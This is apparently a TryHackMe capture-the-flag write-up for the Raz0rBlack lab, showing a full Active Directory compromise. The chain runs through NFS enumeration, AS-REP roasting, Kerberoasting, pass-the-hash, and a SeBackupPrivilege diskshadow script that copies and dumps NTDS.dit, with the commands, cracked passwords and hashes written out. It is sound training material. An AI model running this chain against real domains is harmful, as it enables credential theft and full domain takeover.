---
tags:
  - THM
  - Windows
  - Medium
  - AD
  - Leakage
  - Brute-Force
  - AS-REP
  - PtH
  - Kerberoasting
  - SeBackupPrivilege
---
https://tryhackme.com/room/raz0rblack/
# Add Hosts
Append to the `/etc/hosts` file:
```text
10.66.144.101 HAVEN-DC HAVEN-DC.raz0rblack.thm raz0rblack.thm
```

# Scanning

As we can look, the target is a **Domain Controller**:

```console
$ nmap -p53,88,111,135,139,389,445,464,593,636,2049,3268,3269,3389,5985,9389,47001,49664,49665,49667,49668,49669,49671,49672,49688,49695,49706,49713 -sV -sC raz0rblack.thm

PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-02-04 20:00:30Z)
111/tcp   open  rpcbind?
| rpcinfo: 
|   program version    port/proto  service
|   100003  2,3         2049/udp   nfs
|   100003  2,3         2049/udp6  nfs
|   100003  2,3,4       2049/tcp   nfs
|   100003  2,3,4       2049/tcp6  nfs
|   100005  1,2,3       2049/tcp   mountd
|   100005  1,2,3       2049/tcp6  mountd
|   100005  1,2,3       2049/udp   mountd
|_  100005  1,2,3       2049/udp6  mountd
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: raz0rblack.thm, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
2049/tcp  open  mountd        1-3 (RPC #100005)
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: raz0rblack.thm, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
| rdp-ntlm-info: 
|   Target_Name: RAZ0RBLACK
|   NetBIOS_Domain_Name: RAZ0RBLACK
|   NetBIOS_Computer_Name: HAVEN-DC
|   DNS_Domain_Name: raz0rblack.thm
|   DNS_Computer_Name: HAVEN-DC.raz0rblack.thm
|   Product_Version: 10.0.17763
|_  System_Time: 2026-02-04T20:01:27+00:00
|_ssl-date: 2026-02-04T20:01:36+00:00; 0s from scanner time.
| ssl-cert: Subject: commonName=HAVEN-DC.raz0rblack.thm
| Not valid before: 2026-02-03T19:58:57
|_Not valid after:  2026-08-05T19:58:57
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49669/tcp open  msrpc         Microsoft Windows RPC
49671/tcp open  msrpc         Microsoft Windows RPC
49672/tcp open  msrpc         Microsoft Windows RPC
49688/tcp open  msrpc         Microsoft Windows RPC
49695/tcp open  msrpc         Microsoft Windows RPC
49706/tcp open  msrpc         Microsoft Windows RPC
49713/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: HAVEN-DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2026-02-04T20:01:29
|_  start_date: N/A
```
# User Enumeration
Found `/user` as available mount point in NFS, so mounted it and got the **Steven's flag**:
```console
$ showmount -e raz0rblack.thm
Export list for raz0rblack.thm:
/users (everyone)

$ sudo -s

# mkdir /mnt/users

# mount -t nfs raz0rblack.thm:/users /mnt/users -o nolock

# ls /mnt/users
employee_status.xlsx  sbradley.txt

# cat /mnt/users/sbradley.txt
```

Then, after opening the Excel file with [ONLYOFFICE](https://www.onlyoffice.com/), found a valid list of employees (potential users). Based on the `sbradley.txt` filename, we create our `users.txt` file:
```text
dport
iroyce
tvidal
aedwards
cingram
ncassidy
rzaydan
lvetrova
rdelgado
twilliams
sbradley
clin
```

Found valid users:

```console
$ kerbrute userenum --dc 10.66.144.101 -d 'raz0rblack.thm' users.txt

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: v1.0.3 (9dad6e1) - 02/05/26 - Ronnie Flathers @ropnop

2026/02/05 16:53:10 >  Using KDC(s):
2026/02/05 16:53:10 >  	10.66.144.101:88

2026/02/05 16:53:10 >  [+] VALID USERNAME:	lvetrova@raz0rblack.thm
2026/02/05 16:53:10 >  [+] VALID USERNAME:	twilliams@raz0rblack.thm
2026/02/05 16:53:11 >  [+] VALID USERNAME:	sbradley@raz0rblack.thm
2026/02/05 16:53:11 >  Done! Tested 12 usernames (3 valid) in 0.246 seconds
```

So, re-wrote `users.txt` file with the next content:

```text
lvetrova
twilliams
sbradley
```

# AS-REP

Found user *twilliams* with **pre-authentication disabled**:

```console
$ GetNPUsers.py raz0rblack.thm/ -request -outputfile TGTs.txt -usersfile users.txt -no-pass
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[-] User lvetrova doesn't have UF_DONT_REQUIRE_PREAUTH set
$krb5asrep$23$twilliams@RAZ0RBLACK.THM:1e685f887f2cb2b4fdd958fc3002a359$d96998c765565fdda219aee1d0ac3025081281a8f26c183dfca5394196a5cbb9f6d1efcecb6599b4ea38dd66153b24a345a172bc2d8273a05fe2169cd9c2e667ddcf81465e07534a5ad4b3ec9f67e0ff1abf568a2678e5fae4ee5fc305bda2a46d0824e8dc1b801b77c764b45b06371845f0def962a68706868a97ec5cfd819a370806d510c97c70e9e797bf711e26803394a42f485e79816dbcb9dad2cd3d7bc0a02feacf49617657a68c43841b0ad99d14a3e8875550a3f793415e029e9ce10348e7de3dc7b2bca7a8338bf7e043b5ca95c5f2a430d79828044d7ada345fc2ccb3970c80922b2e18b6656747489233
[-] User sbradley doesn't have UF_DONT_REQUIRE_PREAUTH set
```

Cracked *twilliams* password:

```console
$ hashcat -a 0 -m 18200 TGTs.txt /usr/share/dict/rockyou.txt 
...
$krb5asrep$23$twilliams@RAZ0RBLACK.THM:1e685f887f2cb2b4fdd958fc3002a359$d96998c765565fdda219aee1d0ac3025081281a8f26c183dfca5394196a5cbb9f6d1efcecb6599b4ea38dd66153b24a345a172bc2d8273a05fe2169cd9c2e667ddcf81465e07534a5ad4b3ec9f67e0ff1abf568a2678e5fae4ee5fc305bda2a46d0824e8dc1b801b77c764b45b06371845f0def962a68706868a97ec5cfd819a370806d510c97c70e9e797bf711e26803394a42f485e79816dbcb9dad2cd3d7bc0a02feacf49617657a68c43841b0ad99d14a3e8875550a3f793415e029e9ce10348e7de3dc7b2bca7a8338bf7e043b5ca95c5f2a430d79828044d7ada345fc2ccb3970c80922b2e18b6656747489233:roastpotatoes
...
```

# Becoming lvetrova

Found out that *sbradley* is being required to change his password on next logon, so we set it:

```console
$ nxc smb raz0rblack.thm -u users.txt -p 'roastpotatoes' --continue-on-success
SMB         10.66.144.101   445    HAVEN-DC         [*] Windows 10 / Server 2019 Build 17763 x64 (name:HAVEN-DC) (domain:raz0rblack.thm) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.66.144.101   445    HAVEN-DC         [-] raz0rblack.thm\lvetrova:roastpotatoes STATUS_LOGON_FAILURE 
SMB         10.66.144.101   445    HAVEN-DC         [+] raz0rblack.thm\twilliams:roastpotatoes 
SMB         10.66.144.101   445    HAVEN-DC         [-] raz0rblack.thm\sbradley:roastpotatoes STATUS_PASSWORD_MUST_CHANGE

$ changepasswd.py -newpass 'roastpotatoes' sbradley:roastpotatoes@raz0rblack.thm
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Changing the password of Builtin\sbradley
[*] Connecting to DCE/RPC as Builtin\sbradley
[!] Password is expired or must be changed, trying to bind with a null session.
[*] Connecting to DCE/RPC as null session
[*] Password was changed successfully.
```

Found a `/trash` SMB share, so downloaded its contents:

```console
$ smbmap -H 'raz0rblack.thm' -u 'sbradley' -p 'roastpotatoes'
...
[+] IP: 10.66.144.101:445	Name: raz0rblack.thm      	Status: Authenticated
	Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	ADMIN$                                            	NO ACCESS	Remote Admin
	C$                                                	NO ACCESS	Default share
	IPC$                                              	READ ONLY	Remote IPC
	NETLOGON                                          	READ ONLY	Logon server share 
	SYSVOL                                            	READ ONLY	Logon server share 
	trash                                             	READ ONLY	Files Pending for deletion
[*] Closed 1 connections

$ smbclient -U 'sbradley%roastpotatoes' //raz0rblack.thm/trash
smb: \> ls
  .                                   D        0  Tue Mar 16 00:01:28 2021
  ..                                  D        0  Tue Mar 16 00:01:28 2021
  chat_log_20210222143423.txt         A     1340  Thu Feb 25 13:29:05 2021
  experiment_gone_wrong.zip           A 18927164  Tue Mar 16 00:02:20 2021
  sbradley.txt                        A       37  Sat Feb 27 13:24:21 2021

		5101823 blocks of size 4096. 996470 blocks available
smb: \> mget chat_log_20210222143423.txt experiment_gone_wrong.zip
```

The ZIP file contains the `system.hive` and the `ntds.dit` file which is talked about in the log file:

```console
$ cat chat_log_20210222143423.txt
sbradley> Hey Administrator our machine has the newly disclosed vulnerability for Windows Server 2019.
Administrator> What vulnerability??
sbradley> That new CVE-2020-1472 which is called ZeroLogon has released a new PoC.
Administrator> I have given you the last warning. If you exploit this on this Domain Controller as you did previously on our old Ubuntu server with dirtycow, I swear I will kill your WinRM-Access.
sbradley> Hey you won't believe what I am seeing.
Administrator> Now, don't say that you ran the exploit.
sbradley> Yeah, The exploit works great it needs nothing like credentials. Just give it IP and domain name and it resets the Administrator pass to an empty hash.
sbradley> I also used some tools to extract ntds. dit and SYSTEM.hive and transferred it into my box. I love running secretsdump.py on those files and dumped the hash.
Administrator> I am feeling like a new cron has been issued in my body named heart attack which will be executed within the next minute.
Administrator> But, Before I die I will kill your WinRM access..........
sbradley> I have made an encrypted zip containing the ntds.dit and the SYSTEM.hive and uploaded the zip inside the trash share.
sbradley> Hey Administrator are you there ...
sbradley> Administrator .....

The administrator died after this incident.

Press F to pay respects
```

So, we crack the ZIP to get its contents:

```console
$ zip2john experiment_gone_wrong.zip > experiment.hash

$ john --wordlist=/usr/share/dict/rockyou.txt experiment.hash
...
electromagnetismo (experiment_gone_wrong.zip)
...

$ 7z x experiment_gone_wrong.zip
...
Enter password:electromagnetismo
...

$ file ntds.dit system.hive 
ntds.dit:    Extensible storage engine DataBase, version 0x620, checksum 0xaf2c169f, page size 8192, DirtyShutdown, Windows version 10.0
system.hive: MS Windows registry file, NT/2000 or above
```

Now, get a copy of the previous hashes and test each hash for each current user using pass-the-hash (will take some time):

```console
$ secretsdump.py -system system.hive -ntds ntds.dit -outputfile old_hashes LOCAL

$ awk -F ':' '{print $4}' old_hashes.ntds > old_ntlm.txt

$ nxc smb raz0rblack.thm -u users.txt -H old_ntlm.txt --continue-on-success
...
SMB         10.66.144.101   445    HAVEN-DC         [+] raz0rblack.thm\lvetrova:f220d3988deb3f516c73f40ee16c431d
...
```

Connect to the system via winRM as **lvetrova**:

```console
$ evil-winrm-py -i raz0rblack.thm -u 'lvetrova' -H 'f220d3988deb3f516c73f40ee16c431d'
```

Get **her flag**:

```console
PS> type C:\Users\lvetrova\lvetrova.xml
<Objs Version="1.1.0.1" xmlns="http://schemas.microsoft.com/powershell/2004/04">
  <Obj RefId="0">
    <TN RefId="0">
      <T>System.Management.Automation.PSCredential</T>
      <T>System.Object</T>
    </TN>
    <ToString>System.Management.Automation.PSCredential</ToString>
    <Props>
      <S N="UserName">Your Flag is here =&gt;</S>
      <SS N="Password">01000000d08c9ddf0115d1118c7a00c04fc297eb010000009db56a0543f441469fc81aadb02945d20000000002000000000003660000c000000010000000069a026f82c590fa867556fe4495ca870000000004800000a0000000100000003b5bf64299ad06afde3fc9d6efe72d35500000002828ad79f53f3f38ceb3d8a8c41179a54dc94cab7b17ba52d0b9fc62dfd4a205f2bba2688e8e67e5cbc6d6584496d107b4307469b95eb3fdfd855abe27334a5fe32a8b35a3a0b6424081e14dc387902414000000e6e36273726b3c093bbbb4e976392a874772576d</SS>
    </Props>
  </Obj>
</Objs>

PS> $cred = Import-Clixml -Path "C:\Users\lvetrova\lvetrova.xml"

PS> $cred.GetNetworkCredential().Password
```

# Kerberoasting

We just became **lvetrova** user because of TryHackMe's questions. In reality, after getting **twilliams** credentials, we could have gone to this step.

We request a Ticket Granting Service to perform a Kerberoasting attack and crack the hashes:

```console
$ GetUserSPNs.py -request -outputfile TGSs.txt 'raz0rblack.thm/twilliams:roastpotatoes'

$ hashcat -a 0 -m 13100 TGSs.txt /usr/share/dict/rockyou.txt
...
$krb5tgs$23$*xyan1d3$RAZ0RBLACK.THM$raz0rblack.thm/xyan1d3*$e294dc824bea80c2a6c08f7b675a231d$eb5b4430ad31e225ab8fe50671d02a636b07576ea8c234fe55f5b2d3b358013d8a3560a8e6ad57e3173b897c1a99d318f6539af4705d11302e78c6579f21c44af95bdf792ec47fe7eaacd8c3d7292d8c2ea0df52a9d55e9d94d2d3afa540e712337147bcb36451e0f5ca31bc2b51b884c4a0e24e95e0a35926d46efc459e358e1eb973cfcdcbeb49dc5a756c629f39afa9a8ed5d84841e553e037161f8bb47a809a5daec1d57fb01eca47df84b1b175c80fffe4803604270b65f49d17d8a2a6e0d1f88072617aa0b0caf28f7c2c5bfaaa90e5c31190cc6aa830c7a0bd9585473b9f47de05b0b8497084721b2ec2c4fad823b2aa54059bb69e47dcce196f0b7bb58246ded3995fc8591cb0c2d5e6d11aa5dafc9ad59b351b1364c0768b969b767057e3c54822e481be4844092a6f2958cb4388562c40ae4bf9bfee864b652f4689894acf8d1f8372a542da439871a66c32b39a522439beabece70a2aa9f138866be9f4adf29aa421aad9291ced686ab75280e8cbae22945c22ad827d49a793717cd841155db67499f3f346e44d3a27096092789e131151e8fa645d6e4b7174386e78562621055915b4779a1146d3b60dd54ade7a9f14d6ae811f1a534a0fdd31a857d78f49476b2f0070eb434cb091452c6951c984cc8a21940c2572ce876b9b575cf155533faff1b3163b7ce9ddc6134e5a25b380200fedb7e8ffb41eba0e7ecd68209b161d44e28c67051fb2d367d022aa89791778c747b71ae611537ef84cc4249aedaa5838b90e74a05b3bf543386d9f2f646461596f3347b3747f8283763f83104fcd4adb29d104f31ea2caa09cedbe72d4a9526fd4640b1a7c7402a013a1074595f997c26373190bbc70908ccd3141e224c1b52bb6778d732c5ac3d0f19fca1f2dd0cb193babfadd6bb6df95bf1231b044fe60faaeedf393555676a1ff138946746dce911fe51cc1977214077d9c89727303443aa5d066f78f3c2c389bb5b299039dbe4d51bc61ad1136d109da50eb781a4d543d88d5b65d3c54b3baf677ba3caafa18d52e75f64d0bd7cfbe820c4532897e28bfcebcfe9054a0ca097133078c2028e57c6d0e162498fc3ad38b3e4f8ec99a372cadcebb014f1f9ea81421356a652fc87aacee6acd850d306c28e581e50ff259e5e5e6e74a932b25f957805976900233663b0990bd06db43c74a6bfc0a424010fd68d74b477fe513753adec3110d9c4bc32a7e8da3e6af0d1f8b4ef063ba6a08b29463e50b1b5f122ad6c410ddb9af4867399c0885034daa2067758a9a6f4d3b1576b5d6a097f3890a3cedbe5cfe6d3908418059a3f4ab4d5ff962626c4a43dc7c3128f4e649c1d84f31de1dd51f24a7ceccbcdb9b4bac694a8865a78e5633999aa65c4486966aa1ff33cf9004576bca94b9c2cb674656d3408a6:cyanide9amine5628
...
```

Then, we connect to the machine via WinRM and get **Xyan1d3's Flag**:

```console
$ evil-winrm-py -i raz0rblack.thm -u 'xyan1d3' -p 'cyanide9amine5628'

PS> $cred = Import-Clixml -Path "C:\Users\xyan1d3\xyan1d3.xml"

PS> $cred.GetNetworkCredential().Password
```

# Privilege Escalation

Found out that we possess the **SeBackupPrivilege**:

```console
PS> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State  
============================= ============================== =======
SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeBackupPrivilege             Back up files and directories  Enabled
SeRestorePrivilege            Restore files and directories  Enabled
SeShutdownPrivilege           Shut down the system           Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
```

Since we can essentially read every system file to "backup" the system, we create this `back_script.txt` script based on [this guide](https://medium.com/r3d-buck3t/windows-privesc-with-sebackupprivilege-65d2cd1eb960):

```text
set verbose on
set metadata C:\Windows\Temp\meta.cab
set context clientaccessible
set context persistent
begin backup
add volume C: alias cdrive
create
expose %cdrive% E:
end backup
```

Since Windows expects carriage return (`\r\n`) in many files, we format the script to add it:

```console
$ unix2dos back_script.txt
```

From WinRM session, we upload the script and create a copy `NTDS.dit`:
```console
PS> mkdir C:\Windows\Temp\PrivEsc

PS> cd C:\Windows\Temp\PrivEsc

PS> upload back_script.txt C:\Windows\Temp\PrivEsc\back_script.txt
...

PS> diskshadow /s back_script.txt
...

PS> robocopy /b E:\Windows\ntds . NTDS.dit
...
```

After, we create a copy of `SYSTEM`, and download both files:
```console
PS> reg save hklm\system C:\Windows\Temp\PrivEsc\SYSTEM
The operation completed successfully.

PS> download NTDS.dit NTDS.dit
...

PS> download SYSTEM SYTEM
...
```

In the local machine, we can now get all the domain hashes and pass-the-hash as **Administrator**:
```console
$ secretsdump.py -system SYSTEM -ntds NTDS.dit -outputfile new_hashes LOCAL
...

$ cat new_hashes.ntds
Administrator:500:aad3b435b51404eeaad3b435b51404ee:9689931bed40ca5a2ce1218210177f0c:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
HAVEN-DC$:1000:aad3b435b51404eeaad3b435b51404ee:dfc9336e4a3c042e7084ec5ae3fa2380:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:fa3c456268854a917bd17184c85b4fd1:::
raz0rblack.thm\xyan1d3:1106:aad3b435b51404eeaad3b435b51404ee:bf11a3cbefb46f7194da2fa190834025:::
raz0rblack.thm\lvetrova:1107:aad3b435b51404eeaad3b435b51404ee:f220d3988deb3f516c73f40ee16c431d:::
raz0rblack.thm\sbradley:1108:aad3b435b51404eeaad3b435b51404ee:351c839c5e02d1ed0134a383b628426e:::
raz0rblack.thm\twilliams:1109:aad3b435b51404eeaad3b435b51404ee:351c839c5e02d1ed0134a383b628426e:::

$ nxc smb raz0rblack.thm -u 'Administrator' -H '9689931bed40ca5a2ce1218210177f0c'
SMB         10.66.144.101   445    HAVEN-DC         [*] Windows 10 / Server 2019 Build 17763 x64 (name:HAVEN-DC) (domain:raz0rblack.thm) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.66.144.101   445    HAVEN-DC         [+] raz0rblack.thm\Administrator:9689931bed40ca5a2ce1218210177f0c (Pwn3d!)
```

We connect via winRM and get the **Administrator flag**:

```console
$ evil-winrm-py -i raz0rblack.thm -u 'Administrator' -H '9689931bed40ca5a2ce1218210177f0c'

PS> type C:\Users\Administrator\root.xml
<Objs Version="1.1.0.1" xmlns="http://schemas.microsoft.com/powershell/2004/04">
  <Obj RefId="0">
    <TN RefId="0">
      <T>System.Management.Automation.PSCredential</T>
      <T>System.Object</T>
    </TN>
    <ToString>System.Management.Automation.PSCredential</ToString>
    <Props>
      <S N="UserName">Administrator</S>
      <SS N="Password">44616d6e20796f752061726520612067656e6975732e0a4275742c20492061706f6c6f67697a6520666f72206368656174696e6720796f75206c696b6520746869732e0a0a4865726520697320796f757220526f6f7420466c61670a54484d7b31623466343663633466626134363334383237336431386463393164613230647d0a0a546167206d65206f6e2068747470733a2f2f747769747465722e636f6d2f5879616e3164332061626f75742077686174207061727420796f7520656e6a6f796564206f6e207468697320626f7820616e642077686174207061727420796f75207374727567676c656420776974682e0a0a496620796f7520656e6a6f796564207468697320626f7820796f75206d617920616c736f2074616b652061206c6f6f6b20617420746865206c696e75786167656e637920726f6f6d20696e207472796861636b6d652e0a576869636820636f6e7461696e7320736f6d65206c696e75782066756e64616d656e74616c7320616e642070726976696c65676520657363616c6174696f6e2068747470733a2f2f7472796861636b6d652e636f6d2f726f6f6d2f6c696e75786167656e63792e0a</SS>
  </Obj>
</Objs>
```

Decipher the **flag**:

```console
$ echo '44616d6e20796f752061726520612067656e6975732e0a4275742c20492061706f6c6f67697a6520666f72206368656174696e6720796f75206c696b6520746869732e0a0a4865726520697320796f757220526f6f7420466c61670a54484d7b31623466343663633466626134363334383237336431386463393164613230647d0a0a546167206d65206f6e2068747470733a2f2f747769747465722e636f6d2f5879616e3164332061626f75742077686174207061727420796f7520656e6a6f796564206f6e207468697320626f7820616e642077686174207061727420796f75207374727567676c656420776974682e0a0a496620796f7520656e6a6f796564207468697320626f7820796f75206d617920616c736f2074616b652061206c6f6f6b20617420746865206c696e75786167656e637920726f6f6d20696e207472796861636b6d652e0a576869636820636f6e7461696e7320736f6d65206c696e75782066756e64616d656e74616c7320616e642070726976696c65676520657363616c6174696f6e2068747470733a2f2f7472796861636b6d652e636f6d2f726f6f6d2f6c696e75786167656e63792e0a' | xxd -r -ps
Damn you are a genius.
But, I apologize for cheating you like this.

Here is your Root Flag
...
```

# Final Questions

We are asked for **Tyson's flag**, which is essentially the **twilliams** user. So, we get into his directory, and find it:

```console
PS> cd C:\Users\twilliams

PS> ls
Directory: C:\Users\twilliams


Mode                LastWriteTime         Length Name                                                                   
----                -------------         ------ ----                                                                   
d-r---        9/15/2018  12:19 AM                Desktop                                                                
d-r---        2/25/2021  10:18 AM                Documents                                                              
d-r---        9/15/2018  12:19 AM                Downloads                                                              
d-r---        9/15/2018  12:19 AM                Favorites                                                              
d-r---        9/15/2018  12:19 AM                Links                                                                  
d-r---        9/15/2018  12:19 AM                Music                                                                  
d-r---        9/15/2018  12:19 AM                Pictures                                                               
d-----        9/15/2018  12:19 AM                Saved Games                                                            
d-r---        9/15/2018  12:19 AM                Videos                                                                 
-a----        2/25/2021  10:20 AM             80 definitely_definitely_definitely_definitely_definitely_definitely_defin
                                                 itely_definitely_definitely_definitely_definitely_definitely_definitely
                                                 _definitely_definitely_definitely_definitely_definitely_definitely_defi
                                                 nitely_not_a_flag.exe

PS> type def*
...
```

Found a "top secret" folder with an image. So, downloaded it:

```console
PS> cd 'C:\Program Files\Top Secret\'

PS> download top_secret.png top_secret.png
...
```

The image is just a meme explaining the way to exit Vim. So the correct answer to the top secret is "**:wq**".